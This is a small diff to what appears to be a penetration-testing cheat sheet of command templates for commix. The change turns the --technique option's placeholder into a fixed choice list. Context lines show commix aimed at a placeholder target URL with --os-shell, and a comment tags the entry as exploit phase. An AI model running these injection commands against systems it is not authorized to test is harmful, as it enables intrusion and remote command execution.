@@ -54,7 +54,7 @@ commix -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell
 Force a specific injection technique (e.g., classic, eval, time-based, file-based).
 
 ```bash
-commix -u "{{URL:url:http://target.com/page.php?id=1}}" --technique={{TECHNIQUE:str:c}} --skip-empty
+commix -u "{{URL:url:http://target.com/page.php?id=1}}" --technique={{TECHNIQUE:choice:c,e,t,f}} --skip-empty
 ```
 
 <!-- meta: risk=med | phase=exploit | tags=technique,classic,timebased -->
